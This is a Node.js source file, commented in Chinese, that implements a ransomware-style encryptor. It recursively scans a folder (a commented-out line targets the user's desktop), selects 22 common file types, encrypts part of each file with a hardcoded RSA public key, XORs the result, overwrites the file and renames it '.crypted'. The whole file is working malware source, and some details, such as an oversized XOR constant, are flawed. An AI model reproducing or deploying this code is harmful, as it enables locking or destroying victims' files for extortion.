const fs = require('fs'),
	path = require('path'),
	RSAKey = require('./Rsa'),
	// dst = process.env.userprofile + "\\desktop\\123",
	dst = path.join(__dirname, "examples"),
	bufferArr = [];

//自定义控制台颜色输出
{
	const colors = {
		Reset: "\x1b[0m",
		FgRed: "\x1b[31m",
		FgGreen: "\x1b[32m",
		FgYellow: "\x1b[33m",
		FgBlue: "\x1b[34m"
	};
	"debug:debug:FgBlue,info::FgGreen,warn:警告:FgYellow,error:error:FgRed".split(",").forEach(function (logcolor) {
		const [log, info, color] = logcolor.split(':');
		const logger = function (...args) {
			console.log(args[0], args.slice(1, args.length - 1), args[args.length - 1])
		} || console[log] || console.log;
		console[log] = (...args) => logger.apply(null, [`[${getTime()}]  ${colors[color]}[${info.toUpperCase() || log.toUpperCase()}]${colors.Reset}`, ...args, colors.Reset]);
	});
}

const RSADo = {
	'modulus': '918DE21674D7B5CE8A759BC55985556568F54AAEDFFE275E8945F179C43F276BC4FDEA9FF86F8D14AC7F0A16ED69A8208F2E90E7486C3D66D55DDADFA4E7ED8EDD6BC4B486D43194867EA15BC0245090A8B0F70901B93DB010DA8C11041CFDB98CF1AA1B08D9E74C9930FAE92393E479525A72A027C403CF0D86A26B8A4591AD',
	"publicExponent": "10001"
}

// 加密这些类型的文件,共22种文件类型,可添加更多
const fileExtNames = [".jpg", ".bmp", ".zip", ".exe", ".mp3", ".wmv", ".doc", ".ppt", ".htm", ".png", ".gif", ".rar", ".txt", ".wma", ".mp4", ".xls", ".pdf", ".lnk", ".xlsx", ".docx", ".pptx", ".html"]

function logger(info, level) {
	console[level](`[${getTime()}] [${level.toUpperCase()}] ${info}`)
	return fs.appendFileSync(
		path.join(__dirname, "log.log"),
		`[${getTime()}] [${level.toUpperCase()}] ${info} \r\n`,
		{ encoding: "utf8" }
	);
}

function deploy(targetPath, dst) {
	try {
		let str = fs.readFileSync(targetPath).toString('base64');
		const rsa = new RSAKey();
		rsa.setPublic(RSADo.modulus, RSADo.publicExponent);
		const l = str.length;
		let encryptStr = '';
		//由于非对称加密消耗的资源比较多,所以我们只rsa加密100字节,其他的使用异或加密,也可以使用aes加密,这里我们使用异或来加密
		if (l <= 100) {
			// 小于100byte的文件直接使用rsa加密
			encryptStr = rsa.encrypt(str);
			str = encryptStr;
		} else if (l === 101) {
			encryptStr = rsa.encrypt(str.slice(1));
			str = str.slice(0, 1) + encryptStr;
		} else {
			if (l % 2) {
				// 假如l等于103,那么left等于2,right等于-1
				const left = (l - 99) / 2, right = -(left - 1);
				// console.info('奇数', l / 2);
				encryptStr = rsa.encrypt(str.slice(left, right));
				// 加密文件中间的100字节,然后把加密的内容放在末尾
				str = str.slice(0, left) + str.slice(right) + encryptStr;
			} else {
				// 假如1等于102,那么left等于1,right等于-1
				const left = (l - 100) / 2;
				const right = -left;
				// console.info('偶数', l / 2, 'before', str.slice(left, right));
				encryptStr = rsa.encrypt(str.slice(left, right));
				str = str.slice(0, left) + str.slice(right) + encryptStr;
			}
		}
		// 加密文件后缀名
		const fileExtname = Buffer.from(path.extname(targetPath).slice(1, path.extname(targetPath).length)).toString('base64');
		const encryptFileExtname = rsa.encrypt(fileExtname);
		// 将文件名放于加密字符串的头部
		str = encryptFileExtname + str;
		const buf = Buffer.from(str);
		for (let i = 0; i < buf.length; i++) {
			buf[i] = buf[i] ^ 17302554875;
		};
		fs.writeFileSync(targetPath, buf);
		const renameFiles = path.basename(targetPath, path.extname(targetPath)) + `.crypted`;
		fs.renameSync(targetPath, path.join(dst, renameFiles));
		logger(`加密成功: ${targetPath} ${renameFiles}`, 'info')
	} catch (err) {
		logger(`deploy 过程中发生了错误: ${err.stack || err.toString()}`, "error")
	}
}

encrypt(dst)
	.then(() => {
		logger("all tasks finished", 'info')
	}).catch(err => {
		logger(`处理加密文件过程中发生错误: ${err.stack || err.toString()}`, 'error')
	})

function encrypt(dst) {
	if (!fs.existsSync(dst)) {
		logger("目标文件夹不存在", 'warn')
		return Promise.resolve()
	} else if (!fs.statSync(dst).isDirectory()) {
		logger("目标地址不是文件夹", 'warn');
		return Promise.resolve()
	}
	return new Promise(function (resolve) {
		const promiseArr = [];
		fs.readdirSync(dst).forEach(function (files) {
			const targetPath = path.join(dst, files)
			if (!fileExtNames.some(item => path.extname(targetPath) === item)) {
				if (fs.statSync(targetPath).isDirectory()) {
					return encrypt(targetPath);
				}
			} else {
				const promise = new Promise((res) => {
					//nodejs不支持大于500M的文件
					if (fs.statSync(targetPath).size > 500 * 1024 * 1024) {
						logger(`发现大文件: ${targetPath} ${fs.statSync(targetPath).size / 1024 / 1024}`, 'info')
						return res();
					}
					//处理相同文件名，不同后缀名的文件，防止加密后丢失相应的文件
					logger(`targetPath: ${targetPath}`, 'info')
					const arr = targetPath.split(".")
					arr.pop()
					const filePathWithoutExtname = arr.join(".")
					if (bufferArr.some(item => item.includes(filePathWithoutExtname))) {
						//需要处理多个相同文件名,不同后缀名的情况
						const renameFile = getNotSameFilename(targetPath, dst) + path.extname(targetPath);
						logger(`同一文件目录下出现相同的文件名: ${targetPath}`, 'info')
						const renameFilePath = path.join(dst, renameFile)
						fs.renameSync(targetPath, renameFilePath);
						bufferArr.push(renameFilePath);
						return res(deploy(renameFilePath, dst))
					} else {
						bufferArr.push(targetPath);
						deploy(targetPath, dst)
						return res();
					}
				}).catch(err => {
					logger(`处理文件过程中发生了错误: ${err.stack || err.toString()}`, 'error')
				})
				promiseArr.push(promise);
			}
		});
		return Promise.all(promiseArr).then(function () {
			resolve();
		}).catch(err => {
			logger(`加密文件过程中发生错误: ${err.stack || err.toString()}`, 'error')
		})
	})
}

function getNotSameFilename(targetFilePath, dst) {
	const renameFilePath = `${path.basename(targetFilePath, path.extname(targetFilePath))}Same`
	if (bufferArr.some(item => item.includes(renameFilePath))) {
		return getNotSameFilename(renameFilePath, dst)
	} else {
		return renameFilePath
	}
}

process.on('uncaughtException', function (err) {
	logger(`uncaughtException: ${err.stack || err.toString()}`, "error");
});

process.on('unhandledRejection', (error) => {
	logger(`unhandledRejection: ${error.stack || error.toString()}`, 'error');
});


function getTime() {
	let year = new Date().getFullYear();
	let month = new Date().getMonth() + 1;
	let day = new Date().getDate();
	let hour = new Date().getHours();
	let minute = new Date().getMinutes();
	let second = new Date().getSeconds();
	let mileSecond = new Date().getMilliseconds();
	if (hour < 10) {
		hour = "0" + hour
	}
	if (minute < 10) {
		minute = "0" + minute
	}
	if (second < 10) {
		second = "0" + second
	}
	if (mileSecond < 10) {
		mileSecond = "00" + mileSecond
	} else if (mileSecond < 100) {
		mileSecond = "0" + mileSecond
	}
	time = `${year}-${month}-${day} ${hour}:${minute}:${second}.${mileSecond}`;
	return time;
}